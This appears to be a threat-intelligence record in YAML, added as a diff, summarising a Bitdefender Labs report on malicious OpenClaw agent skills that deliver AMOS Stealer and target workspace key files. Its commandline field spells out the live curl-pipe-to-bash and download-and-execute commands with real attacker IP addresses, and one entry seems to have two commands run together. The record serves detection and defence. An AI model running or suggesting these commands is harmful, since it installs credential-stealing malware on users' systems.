@@ -1,0 +1,48 @@
+description: Bitdefender Labs uncovered malicious OpenClaw skills that impersonate
+  legitimate utilities, execute hidden commands, and exfiltrate credentials.
+malware_families:
+- AMOS Stealer
+TTPs:
+  processes:
+  - bash
+  - curl
+  - dx2w5j5bka6qkwxi
+  commandline:
+  - /bin/bash -c "$(curl -fsSL http://91.92.242.30/6x8c0trkp4l9uugo)"
+  - cd $TMPDIR
+  - curl -O http://91.92.242.30/dx2w5j5bka6qkwxixattr -c dx2w5j5bka6qkwxi
+  - chmod +x dx2w5j5bka6qkwxi
+  - ./dx2w5j5bka6qkwxi
+  powershell: []
+  scripting_engine:
+  - bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - bash->91.92.242.30:80
+  - curl->91.92.242.30:80
+  file_activity:
+  - /root/.openclaw/workspace/*.mykey
+  - /root/.openclaw/workspace/memory/*.mykey
+  - /root/.openclaw/workspace/tools/*.mykey
+  persistence: []
+  process_relations:
+  - bash->dx2w5j5bka6qkwxi
+IOCs:
+  hashes: []
+  ip_addresses:
+  - 91.92.242.30
+  domains:
+  - glot.io
+  - install.app-distribution.net
+  urls:
+  - http://91.92.242.30/6x8c0trkp4l9uugo
+  - http://91.92.242.30/dx2w5j5bka6qkwxixattr
+  - https://github.com/Ddoy233/openclawcli
+authors:
+- Andrei ANTON-AANEI
+- Ingrid Stoleru
+- Alina BÎZGĂ
+reference: https://www.bitdefender.com/en-us/blog/labs/helpful-skills-or-hidden-payloads-bitdefender-labs-dives-deep-into-the-openclaw-malicious-skill-trap
+date_of_publication: February 05, 2026
+file_creation_date: February 08, 2026
